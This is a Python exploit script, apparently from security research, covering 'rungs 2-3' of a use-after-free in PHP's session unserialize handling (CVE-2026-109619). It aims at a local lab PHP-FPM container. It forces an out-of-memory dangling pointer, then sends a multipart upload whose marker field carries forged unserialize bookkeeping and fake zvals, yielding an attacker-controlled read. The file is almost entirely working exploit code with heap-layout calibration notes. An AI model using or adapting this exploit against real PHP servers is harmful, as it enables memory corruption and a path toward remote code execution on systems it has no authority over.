#!/usr/bin/env python3
"""
CVE-2026-109619 weaponization — Rungs 2-3: forged bookkeeping + weaponized
read (attacker-forged zval returned via R:).

Against lab-zendmm-fpm (:18085). Prerequisite: rung-1 calibration
established that the consumer request's multipart marker field overlays
the freed php_unserialize_data at marker offset MAP_OFF (0x6000 in this
lab build), i.e. addr(marker_offset m) = d - MAP_OFF + m.

Steps:
  A1  build session P (6 MB key: the producer's OOM crossing allocation)
      and session C (filename "x|R:1;" — the php-handler mismatch decode
      splits at the pipe and parses R:1; as the value).
  A2  producer: memory-pressure session_start() -> OOM mid-decode ->
      BG(unserialize).data dangles (INIT print gives us d live).
  B   consumer multipart, API dir (php handler), body:
        [PHPSESSID=C][PHP_SESSION_UPLOAD_PROGRESS][marker 128 KiB][file part]
      The marker carries the forged php_unserialize_data at MAP_OFF:
        +0   last          -> fake var_entries at d+0x2000   (marker 0x8000)
        +8   first_dtor    -> fake var_dtor_entries at d+0x3000 (marker 0x9000)
        +16  last_dtor     -> same fake dtor block
        +24  allowed_classes = 0
        +32  ref_props      = 0
        +40  cur_depth / +48 max_depth = 0
        +56  entries.used_slots = 2
        +64  entries.next   = 0
        +72  entries.data[0] -> fake zval (IS_LONG 0x13371337) at marker 0xA000
        +80  entries.data[1] -> fake zval (IS_LONG 0x4142434445) at marker 0xA010
      FILE_START -> php_session_initialize -> php-handler decode:
        wrapper derefs forged last (WRAP print),
        R:1 -> var_access(1) -> forged entries -> forged zval
        (RREF/RVAL prints) -> ZVAL_COPY: an attacker-forged zval
        materializes as the session value. Weaponized read demonstrated.

For authorized research against your own lab only. The final proof in
this repo remains a fixed benign command.
"""
import argparse
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "RECLAIM"
SID_P = "abcdef0123456789abcdef0123456789"
SID_C = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
MAP_OFF = 0x6000            # marker offset that maps onto d+0 (calibrated)
MARKER_LEN = 128 * 1024

IS_LONG = 4
IS_STRING = 6


def http_req(host, port, raw, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def build_multipart(sid, progress, marker, filename, target_path):
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="m"\r\n\r\n'
    ).encode("latin-1") + marker + (
        f"\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: x\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def build_inject(sid, progress, filename, target_path="/app/upload.php"):
    """Session builder: no marker field (must NOT touch the vulnerable
    parse window before the producer arms)."""
    return build_multipart(sid, progress, b"", filename, target_path)


def docker_exec(container, cmd):
    try:
        r = subprocess.run(["docker", "exec", container] + cmd,
                           capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return f"<docker exec failed: {e}>"


def uafdbg(container, since=60):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{since}s", container],
                           capture_output=True, text=True, timeout=30)
        blob = r.stdout + r.stderr
    except Exception as e:
        return []
    out = []
    for line in blob.splitlines():
        m = re.search(r"\[UAFDBG\] (.*)", line)
        if m:
            out.append(m.group(1).rstrip('"'))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18085")
    ap.add_argument("--container", default="php2shell-zendmm-fpm")
    ap.add_argument("--map-off", type=lambda x: int(x, 0), default=MAP_OFF,
                    help="marker offset mapping onto the freed struct (rung-1 calibration)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80
    cont = args.container

    print("[*] CVE-2026-109619 weaponization — rungs 2-3: forged bookkeeping")
    print(f"[*] Target: {args.target}   marker->d map offset: {hex(args.map_off)}")
    print()

    # --- A1: build sessions P and C --------------------------------------
    print("[A1] Building session P (6 MB key) and session C (x|R:1;)")
    http_req(host, port, build_inject(SID_P, "A" * (6 * 1024 * 1024), "x|i:1;"))
    http_req(host, port, build_inject(SID_C, "c", "x|R:1;"))
    print("     done")
    print()

    # --- A2: producer -------------------------------------------------------
    print("[A2] Producer: memory-pressure session_start() with session P")
    req = (
        f"GET /api/producer.php HTTP/1.1\r\nHost: x\r\n"
        f"Cookie: PHPSESSID={SID_P}\r\nConnection: close\r\n\r\n"
    ).encode()
    resp = http_req(host, port, req, timeout=90)
    print(f"     producer fatal: {b'Allowed memory' in resp}")
    time.sleep(0.4)
    lines = uafdbg(cont, 20)
    d_addr = None
    for l in lines:
        if "INIT" in l and "level=1" in l:
            d_addr = int(l.split("d=")[1].split()[0], 16)
    if not d_addr:
        print("     [!] producer d not found in [UAFDBG] log — aborting")
        sys.exit(1)
    print(f"     producer d = {hex(d_addr)} (INIT published, no DESTROY)")
    base = d_addr - args.map_off
    print(f"     marker absolute base = {hex(base)}")
    print()

    # --- forge the marker ----------------------------------------------------
    # default marker content: benign counter pattern (keeps request shape
    # identical to the calibration run)
    marker = bytearray(b"".join(struct.pack("<Q", i * 8)
                                for i in range(MARKER_LEN // 8)))

    def put(off, data):
        marker[off:off + len(data)] = data

    def q(off, val):
        put(off, struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF))

    # forged php_unserialize_data at d+0 (marker MAP_OFF)
    # NOTE on placement: the consumer request allocates the session-read
    # zend_string and small-bin pages AFTER the marker is in place —
    # empirically the pages holding the forged struct (marker 0x6000+)
    # and the fake entries (0x8000) survive, while 0xA000 collided with
    # the session string's small-bin page. Keep the fake zvals on the
    # fake entries' page. Also: serialized R:n references are 1-based,
    # so R:1 resolves entries data[0] — point data[0] at the magic zval.
    fake_entries_off = 0x8000
    fake_dtor_off = 0x8400
    zval0_off = 0x8100
    zval1_off = 0x8110
    q(args.map_off + 0, base + fake_entries_off)      # last
    q(args.map_off + 8, base + fake_dtor_off)         # first_dtor
    q(args.map_off + 16, base + fake_dtor_off)        # last_dtor
    q(args.map_off + 24, 0)                           # allowed_classes
    q(args.map_off + 32, 0)                           # ref_props
    q(args.map_off + 40, 0)                           # cur_depth
    q(args.map_off + 48, 0)                           # max_depth
    q(args.map_off + 56, 2)                           # entries.used_slots
    q(args.map_off + 64, 0)                           # entries.next
    q(args.map_off + 72, base + zval0_off)            # entries.data[0]
    q(args.map_off + 80, base + zval1_off)            # entries.data[1]

    # fake var_entries (used by the wrapper's orig read and tmp_var):
    #   {zend_long used_slots; void *next; zval *data[...]}
    q(fake_entries_off + 0, 1)        # used_slots (1: tmp_var writes data[1])
    q(fake_entries_off + 8, 0)         # next
    for i in range(4):                # data[0..3] -> safe scratch zvals
        q(fake_entries_off + 16 + 8 * i, base + zval0_off)

    # fake var_dtor_entries: {zend_long used_slots; void *next; zval data[]}
    q(fake_dtor_off + 0, 0)           # used_slots 0 -> any dtor use allocates fresh
    q(fake_dtor_off + 8, 0)           # next

    # fake zvals (16 bytes each: value, u1 type_info, u2)
    put(zval0_off, struct.pack("<QQLL", 0x13371337, IS_LONG, 0, 0))
    put(zval1_off, struct.pack("<QQLL", 0x4142434445, IS_LONG, 0, 0))

    print("[*] Forged bookkeeping (marker offsets, absolute):")
    print(f"     last          -> {hex(base + fake_entries_off)}"
          f" (fake var_entries, marker {hex(fake_entries_off)})")
    print(f"     entries       -> used_slots=2, data[0]={hex(base + zval0_off)}"
          f" data[1]={hex(base + zval1_off)}")
    print(f"     fake zvals    -> IS_LONG 0x13371337 / IS_LONG 0x4142434445")
    print()

    # --- B: consumer (API dir, php handler) ---------------------------------
    print("[B] Consumer: multipart with the forged marker (api/ dir, php")
    print("    handler) -> FILE_START -> mismatch decode of session C ->")
    print("    R:1 -> var_access(1) -> forged entries -> forged zval")
    mark = len(uafdbg(cont, 20))
    req = build_multipart(SID_C, "c", bytes(marker), "consumer.bin",
                          "/api/endpoint.php")
    resp = http_req(host, port, req, timeout=120)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response / child crashed>"
    print(f"     {status}")
    time.sleep(0.5)
    print("=== consumer trace ===")
    hits = 0
    for l in uafdbg(cont, 30)[mark:]:
        print(f"     {l}")
        hits += 1
    if hits == 0:
        print("     <no [UAFDBG] lines — check the producer step>")
    print()
    print("[*] Expected evidence: WRAP last=<fake entries addr> (no crash),")
    print("    RREF id=1 entries=<d+0x38> used=2, RVAL id=1 type=4")
    print("    lval=0x4142434445 — the attacker-forged zval returned through")
    print("    the stale bookkeeping: the weaponized read.")


if __name__ == "__main__":
    main()
